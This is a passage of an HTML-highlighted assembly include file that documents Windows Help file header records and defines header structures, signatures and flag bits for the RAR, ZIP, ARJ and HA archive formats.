</span><span class="sc1">;SYSTEM_HEADER_DATASIZE DW  ?   ;SIZE OF DATA</span><span class="sc0">
</span><span class="sc1">;SYSTEM_HEADER_DATA DB  ?   ;DATASIZE DUP (?)</span><span class="sc0">
</span><span class="sc1">;THERE ARE DIFFERENT RECORDTYPES DEFINED, EACH STORING DIFFERENT DATA.</span><span class="sc0">
</span><span class="sc1">;THEY MAINLY CONTAIN WHAT WAS SPECIFIED IN THE HELP PROJECT FILE.</span><span class="sc0">
</span><span class="sc1">;RECORDTYPE  DATA</span><span class="sc0">
</span><span class="sc1">;1 TITLE     ASCIZ TITLE           HELP FILE TITLE</span><span class="sc0">
</span><span class="sc1">;2 COPYRIGHT ASCIZ COPYRIGHT           COPYRIGHT NOTICE SHOWN IN ABOUTBOX</span><span class="sc0">
</span><span class="sc1">;3 CONTENTS  TOPICOFFSET CONTENTS       TOPIC OFFSET OF STARTING TOPIC</span><span class="sc0">
</span><span class="sc1">;4 CONFIG    ASCIZ MACRO           ALL MACROS EXECUTED ON OPENING</span><span class="sc0">
</span><span class="sc1">;5 ICON     WINDOWS *.ICO FILE         SEE WIN31WH ON ICON FILE FORMAT</span><span class="sc0">
</span><span class="sc1">;6 WINDOW    STRUCT            WINDOWS DEFINED IN THE HPJ-FILE</span><span class="sc0">
</span><span class="sc1">;7 WINDOW    TYPEDEF STRUCT        VIEWER 2.0 WINDOWS DEFINED IN MVP-FILE</span><span class="sc0">
</span><span class="sc1">;8 CITATION  ASCIZ CITATION        THE CITATION PRINTED</span><span class="sc0">
</span><span class="sc1">;9 LCID     DW LCID[4]         LANGUAGE ID, WINDOWS 95 (HCW 4.00)</span><span class="sc0">
</span><span class="sc1">;10 CNT     ASCIZ CONTENTFILENAME    CNT FILE NAME, WINDOWS 95 (HCW 4.00)</span><span class="sc0">
</span><span class="sc1">;11 CHARSET  DW CHARSET     CHARSET, WINDOWS 95 (HCW 4.00)</span><span class="sc0">
</span><span class="sc1">;12 DEFFONT  STRUCT            DEFAULT DIALOG FONT, WINDOWS 95 (HCW 4.00)</span><span class="sc0">
</span><span class="sc1">;12 FTINDEX  ASCIZ DTYPE           MULTIMEDIA HELP FILES DTYPES</span><span class="sc0">
</span><span class="sc1">;13 GROUPS   ASCIZ GROUP           DEFINED GROUPS, MULTIMEDIA HELP FILE</span><span class="sc0">
</span><span class="sc1">;14 INDEX_S. ASCIZ INDEXSEPARATORS    SEPARATORS, WINDOWS 95 (HCW 4.00)</span><span class="sc0">
</span><span class="sc1">;14 KEYINDEX STRUCT            MULTIMEDIA HELP FILES</span><span class="sc0">
</span><span class="sc1">;18 LANGUAGE ASCIZ LANGUAGE        DEFINED LANGUAGE, MULTIMEDIA HELP FILES</span><span class="sc0">
</span><span class="sc1">;19 DLLMAPS  STRUCT            DEFINED DLLMAPS, MULTIMEDIA HELP FILES</span><span class="sc0">
        </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc1">;RAR ARCHIVE</span><span class="sc0">

</span><span class="sc5">RAR_SIGN</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">21726152H</span><span class="sc0">
</span><span class="sc5">RAR_HEAD_SIGN</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">73H</span><span class="sc0">
</span><span class="sc5">RAR_FILE_SIGN</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">74H</span><span class="sc0">
</span><span class="sc5">RAR_STORED</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">30H</span><span class="sc0">

</span><span class="sc5">RAR_HEAD_HDR</span><span class="sc0">    </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">RAR_HEAD_CRC</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;TYPE - RESERVED2</span><span class="sc0">
</span><span class="sc5">RAR_HEAD_TYPE</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;73H</span><span class="sc0">
</span><span class="sc5">RAR_HEAD_FLAGS</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;       0x01    - VOLUME ATTRIBUTE (ARCHIVE VOLUME)</span><span class="sc0">
</span><span class="sc1">;       0x02    - ARCHIVE COMMENT PRESENT</span><span class="sc0">
</span><span class="sc1">;       0x04    - ARCHIVE LOCK ATTRIBUTE</span><span class="sc0">
</span><span class="sc1">;       0x08    - SOLID ATTRIBUTE (SOLID ARCHIVE)</span><span class="sc0">
</span><span class="sc1">;       0x10    - UNUSED</span><span class="sc0">
</span><span class="sc1">;       0x20    - AUTHENTICITY INFORMATION PRESENT</span><span class="sc0">
</span><span class="sc5">RAR_HEAD_SIZE</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">RAR_RESERVED1</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">RAR_RESERVED2</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc1">;COMMENT BLOCK   PRESENT IF (HEAD_FLAGS &amp; 0x02) != 0</span><span class="sc0">

</span><span class="sc5">RAR_FILE_HDR</span><span class="sc0">    </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">RAR_F_HEAD_CRC</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc5">RAR_F_HEAD_TYPE</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;2 74H</span><span class="sc0">
</span><span class="sc5">RAR_F_HEAD_FLAGS</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;3</span><span class="sc0">
</span><span class="sc1">;       0x01 - FILE CONTINUED FROM PREVIOUS VOLUME</span><span class="sc0">
</span><span class="sc1">;       0x02 - FILE CONTINUED IN NEXT VOLUME</span><span class="sc0">
</span><span class="sc1">;       0x04 - FILE ENCRYPTED WITH PASSWORD</span><span class="sc0">
</span><span class="sc1">;       0x08 - FILE COMMENT PRESENT</span><span class="sc0">
</span><span class="sc1">;       0x10 - INFORMATION FROM PREVIOUS FILES IS USED (SOLID FLAG)</span><span class="sc0">
</span><span class="sc1">;           (FOR RAR 2.0 AND LATER)</span><span class="sc0">
</span><span class="sc1">;       BITS 7 6 5 (FOR RAR 2.0 AND LATER)</span><span class="sc0">
</span><span class="sc1">;       0 0 0    - DICTIONARY SIZE   64 KB</span><span class="sc0">
</span><span class="sc1">;       0 0 1    - DICTIONARY SIZE  128 KB</span><span class="sc0">
</span><span class="sc1">;       0 1 0    - DICTIONARY SIZE  256 KB</span><span class="sc0">
</span><span class="sc1">;       0 1 1    - DICTIONARY SIZE  512 KB</span><span class="sc0">
</span><span class="sc1">;       1 0 0    - DICTIONARY SIZE 1024 KB</span><span class="sc0">
</span><span class="sc1">;       1 0 1    - RESERVED</span><span class="sc0">
</span><span class="sc1">;       1 1 0    - RESERVED</span><span class="sc0">
</span><span class="sc1">;       1 1 1    - FILE IS DIRECTORY</span><span class="sc0">
</span><span class="sc1">;       (HEAD_FLAGS &amp; 0x8000) == 1, BECAUSE FULL</span><span class="sc0">
</span><span class="sc1">;       BLOCK SIZE IS HEAD_SIZE + PACK_SIZE</span><span class="sc0">
</span><span class="sc5">RAR_F_HEAD_SIZE</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;5</span><span class="sc0">
</span><span class="sc5">RAR_COMPRESSED_SIZE</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;7</span><span class="sc0">
</span><span class="sc5">RAR_ORIGINAL_SIZE</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;B</span><span class="sc0">
</span><span class="sc5">RAR_HOST_OS</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;F DOS=0,WIN32=2</span><span class="sc0">
</span><span class="sc5">RAR_CRC32</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;10</span><span class="sc0">
</span><span class="sc5">RAR_FILE_TIME</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;14</span><span class="sc0">
</span><span class="sc5">RAR_FILE_DATE</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;16</span><span class="sc0">
</span><span class="sc5">RAR_REQ_VER</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;18 0FH</span><span class="sc0">
</span><span class="sc5">RAR_METHOD</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;19 30H=STORED</span><span class="sc0">
</span><span class="sc5">RAR_FNAME_SIZE</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;1A</span><span class="sc0">
</span><span class="sc5">RAR_FILE_ATTRIB</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;1C</span><span class="sc0">
</span><span class="sc5">RAR_FNAME</span><span class="sc0">       </span><span class="sc9">LABEL</span><span class="sc0">   </span><span class="sc10">BYTE</span><span class="sc0">    </span><span class="sc1">;20</span><span class="sc0">
        </span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc1">;FILE_NAME       FILE NAME - STRING OF NAME_LEN BYTES SIZE</span><span class="sc0">
</span><span class="sc1">;COMMENT BLOCK   PRESENT IF (HEAD_FLAGS &amp; 0x08) != 0</span><span class="sc0">
</span><span class="sc1">;????            OTHER EXTRA INCLUDED BLOCKS - RESERVED FOR FUTURE USE</span><span class="sc0">

</span><span class="sc1">;ZIP ARCHIVE</span><span class="sc0">

</span><span class="sc5">ZIP_LOCAL_SIGN</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">4034B50H</span><span class="sc0">
</span><span class="sc5">ZIP_CENTRAL_SIGN</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">2014B50H</span><span class="sc0">
</span><span class="sc5">ZIP_END_SIGN</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">6054B50H</span><span class="sc0">

</span><span class="sc5">ZIP_LOCAL_HEADER</span><span class="sc0">    </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">ZIP_LOC_SIGN_</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;0 ('PK',3,4)</span><span class="sc0">
</span><span class="sc5">ZIP_VER_NED_TO_EXTR</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;4</span><span class="sc0">
</span><span class="sc5">ZIP_FLAGS</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;6</span><span class="sc0">
</span><span class="sc5">ZIP_COMPRESSION_METHOD</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;8 (0 FOR STORED)</span><span class="sc0">
</span><span class="sc5">ZIP_FILE_TIME</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;A</span><span class="sc0">
</span><span class="sc5">ZIP_FILE_DATE</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;C</span><span class="sc0">
</span><span class="sc5">ZIP_CRC_32</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;E</span><span class="sc0">
</span><span class="sc5">ZIP_COMPRESSED_SIZE</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;12</span><span class="sc0">
</span><span class="sc5">ZIP_UNCOMPRESSED_SIZE</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;16</span><span class="sc0">
</span><span class="sc5">ZIP_SIZE_FNAME</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;1A</span><span class="sc0">
</span><span class="sc5">ZIP_EXTRA_FIELD_LENGTH</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;1C</span><span class="sc0">
</span><span class="sc5">ZIP_LOCAL_FNAME</span><span class="sc0">     </span><span class="sc9">LABEL</span><span class="sc0">   </span><span class="sc10">BYTE</span><span class="sc0">    </span><span class="sc1">;1E</span><span class="sc0">
            </span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc1">;EXTRA FIELD (VARIABLE SIZE)</span><span class="sc0">


</span><span class="sc5">ZIP_CENTRAL_HEADER</span><span class="sc0">  </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">ZIP_CENTR_SIGN_</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;0 ('PK',1,2)</span><span class="sc0">
</span><span class="sc5">ZIP_VER_MADE_BY_</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;4</span><span class="sc0">
</span><span class="sc5">ZIP_VER_NED_TO_EXTR_</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;6</span><span class="sc0">
</span><span class="sc5">ZIP_FLAGS_</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;8</span><span class="sc0">
</span><span class="sc5">ZIP_COMPRESSION_METHOD_</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;A</span><span class="sc0">
</span><span class="sc5">ZIP_FILE_TIME_</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;C</span><span class="sc0">
</span><span class="sc5">ZIP_FILE_DATE_</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;E</span><span class="sc0">
</span><span class="sc5">ZIP_CRC_32_</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;10</span><span class="sc0">
</span><span class="sc5">ZIP_COMPRESSED_SIZE_</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;14</span><span class="sc0">
</span><span class="sc5">ZIP_UNCOMPRESSED_SIZE_</span><span class="sc0">  </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;18</span><span class="sc0">
</span><span class="sc5">ZIP_SIZE_FNAME_</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;1C</span><span class="sc0">
</span><span class="sc5">ZIP_EXTRA_FIELD_LENGTH_</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;1E</span><span class="sc0">
</span><span class="sc5">ZIP_FILE_COMMENT_LENGTH_</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;20</span><span class="sc0">
</span><span class="sc5">ZIP_DISK_NUMBER_START_</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;22</span><span class="sc0">
</span><span class="sc5">ZIP_INTRNL_FILE_ATTR_</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;24</span><span class="sc0">
</span><span class="sc5">ZIP_EXTRNL_FILE_ATTR_</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;26</span><span class="sc0">
</span><span class="sc5">ZIP_REL_OFF_OF_LOC_HDR_</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;2A</span><span class="sc0">
</span><span class="sc5">ZIP_CENTRAL_FNAME</span><span class="sc0">   </span><span class="sc9">LABEL</span><span class="sc0">   </span><span class="sc10">BYTE</span><span class="sc0">    </span><span class="sc1">;2E</span><span class="sc0">
            </span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc1">;EXTRA FIELD (VARIABLE SIZE)</span><span class="sc0">
</span><span class="sc1">;FILE COMMENT (VARIABLE SIZE)</span><span class="sc0">


</span><span class="sc5">ZIP_END_HEADER</span><span class="sc0">      </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">ZIP_END_SIGN_</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;0 ('PK',5,6)</span><span class="sc0">
</span><span class="sc5">NUM_OF_THIS_DISK</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;4</span><span class="sc0">
</span><span class="sc5">NUM_OF_THE_START_DISK</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;6</span><span class="sc0">
</span><span class="sc5">TTL_NUM_OF_ENT_ON_THIS_DISK</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;8</span><span class="sc0">
</span><span class="sc5">TTL_NUM_OF_ENT_IN_THE_CENT_DIR</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;A</span><span class="sc0">
</span><span class="sc5">SIZE_OF_THE_CENTRAL_DIRECTORY</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;C</span><span class="sc0">
</span><span class="sc5">OFF_OF_STRT_OF_CENT_DIRECTORY</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;10</span><span class="sc0">
</span><span class="sc5">ZIPFILE_COMMENT_LENGTH</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;14</span><span class="sc0">
            </span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc1">;ZIPFILE COMMENT (VARIABLE SIZE)        ;16</span><span class="sc0">

</span><span class="sc1">;ARJ ARCHIVE</span><span class="sc0">

</span><span class="sc5">ARJ_SIGN</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">0EA60H</span><span class="sc0">
</span><span class="sc5">ARJ_STORED</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ARJ_HDR_STRUC</span><span class="sc0">   </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">ARJ_HEADER_ID</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;2 HEADER ID (COMMENT AND LOCAL FILE) = 0xEA60</span><span class="sc0">
</span><span class="sc5">ARJ_BAS_HDR_SIZE</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;28 BASIC HEADER SIZE (FROM 'FIRST_HDR_SIZE' THRU 'COMMENT' BELOW)</span><span class="sc0">
</span><span class="sc1">;= FIRST_HDR_SIZE + STRLEN(FILENAME) + 1 + STRLEN(COMMENT) + 1</span><span class="sc0">
</span><span class="sc1">;= 0 IF END OF ARCHIVE</span><span class="sc0">
</span><span class="sc5">ARJ_FIRST_HDR_SIZE</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;1E FIRST_HDR_SIZE (SIZE UP TO 'EXTRA DATA')</span><span class="sc0">
</span><span class="sc5">ARJ_VER_NUM</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;06 ARCHIVER VERSION NUMBER</span><span class="sc0">
</span><span class="sc5">ARJ_MIN_VER</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;01 MINIMUM ARCHIVER VERSION TO EXTRACT</span><span class="sc0">
</span><span class="sc5">ARJ_HOST_OS</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;00 HOST OS (0 = MSDOS)</span><span class="sc0">
</span><span class="sc5">ARJ_FLAGS</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;10 ARJ FLAGS</span><span class="sc0">
        </span><span class="sc1">;(0x01 = GARBLED_FLAG) INDICATES PASSWORDED FILE</span><span class="sc0">
        </span><span class="sc1">;(0x02 = RESERVED)</span><span class="sc0">
        </span><span class="sc1">;(0x04 = VOLUME_FLAG)  INDICATES CONTINUED FILE TO NEXT VOLUME</span><span class="sc0">
        </span><span class="sc1">;(0x08 = EXTFILE_FLAG) INDICATES FILE STARTING POSITION FIELD</span><span class="sc0">
        </span><span class="sc1">;(0x10 = PATHSYM_FLAG) INDICATES PATH TRANSLATED</span><span class="sc0">
</span><span class="sc5">ARJ_COMPRESS_METHOD</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;00 METHOD (0 = STORED)</span><span class="sc0">
</span><span class="sc5">ARJ_FILE_TYPE</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;00 0=BINARY, 1=TEXT</span><span class="sc0">
</span><span class="sc5">ARJ_RESERVED</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;(??? LAST BYTE OF TIME STAMP OF ARJ FILE)</span><span class="sc0">
</span><span class="sc5">ARJ_FILE_TIME</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;DATE TIME STAMP MODIFIED</span><span class="sc0">
</span><span class="sc5">ARJ_FILE_DATE</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ARJ_COMPRESSED_SIZE</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;COMPRESSED SIZE</span><span class="sc0">
</span><span class="sc5">ARJ_ORIGINAL_SIZE</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;ORIGINAL SIZE</span><span class="sc0">
</span><span class="sc5">ARJ_CRC32</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;ORIGINAL FILE'S CRC</span><span class="sc0">
</span><span class="sc5">ARJ_ENTRYNAME_POS</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;0 ENTRYNAME POSITION IN FILENAME</span><span class="sc0">
</span><span class="sc5">ARJ_FILE_ACCESS_MODE</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;0 FILE ACCESS MODE</span><span class="sc0">
</span><span class="sc5">ARJ_HOST_DATA</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;0 HOST DATA (CURRENTLY NOT USED)</span><span class="sc0">
</span><span class="sc5">ARJ_FNAME</span><span class="sc0">   </span><span class="sc9">LABEL</span><span class="sc0">   </span><span class="sc10">BYTE</span><span class="sc0">
</span><span class="sc1">; ?  EXTRA DATA (IF SET EXTFILE_FLAG)</span><span class="sc0">
</span><span class="sc1">;    4 BYTES FOR EXTENDED FILE POSITION</span><span class="sc0">
</span><span class="sc1">; ?  FILENAME (NULL-TERMINATED)</span><span class="sc0">
</span><span class="sc1">; ?  COMMENT  (NULL-TERMINATED)</span><span class="sc0">
</span><span class="sc1">; 4  BASIC HEADER CRC</span><span class="sc0">
</span><span class="sc1">; 2  1ST EXTENDED HEADER SIZE (0 IF NONE) = 0</span><span class="sc0">
</span><span class="sc1">; ?  1ST EXTENDED HEADER</span><span class="sc0">
</span><span class="sc1">; 4  1ST EXTENDED HEADER'S CRC (NOT PRESENT IF 0 EXTENDED HEADER SIZE)</span><span class="sc0">
</span><span class="sc1">; ...</span><span class="sc0">
</span><span class="sc1">; ?  COMPRESSED FILE</span><span class="sc0">
        </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc1">;HA ARCHIVE</span><span class="sc0">

</span><span class="sc5">HA_SIGN</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">4148H</span><span class="sc0">
</span><span class="sc5">HA_STORED</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">20H</span><span class="sc0">

</span><span class="sc1">;HAFILE</span><span class="sc0">
</span><span class="sc1">;0000   HA</span><span class="sc0">
</span><span class="sc1">;0002   CNT</span><span class="sc0">
</span><span class="sc1">;0004   HDR1</span><span class="sc0">
</span><span class="sc1">;.  FILE1</span><span class="sc0">
</span><span class="sc1">;.  HDR2</span><span class="sc0">
</span><span class="sc1">;.  FILE2</span><span class="sc0">

</span><span class="sc5">HA_MAIN_HEADER</span><span class="sc0">  </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">HA_M_SIGN</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;0 HA = IDENTIFIER FOR HA ARCHIVE</span><span class="sc0">
</span><span class="sc5">HA_M_FILE_CNT</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;2 NUMBER OF FILES IN ARCHIVE</span><span class="sc0">
        </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">HA_FILE_HEADER</span><span class="sc0">  </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">HA_VER_METHOD</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;0 VER&lt;&lt;4 | TYPE TYPE 0-CPY,1-ASC,2-HSC</span><span class="sc0">
                    </span><span class="sc1">;  0xE-DIR 0xF-SPECIAL (20H FOR CPY)</span><span class="sc0">
</span><span class="sc5">HA_COMPRESS_SIZE</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;1</span><span class="sc0">
</span><span class="sc5">HA_ORIGINAL_SIZE</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;5</span><span class="sc0">
</span><span class="sc5">HA_CRC32</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;9</span><span class="sc0">
</span><span class="sc5">HA_FILE_TIME</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;D</span><span class="sc0">
</span><span class="sc5">HA_FILE_DATE</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;F</span><span class="sc0">
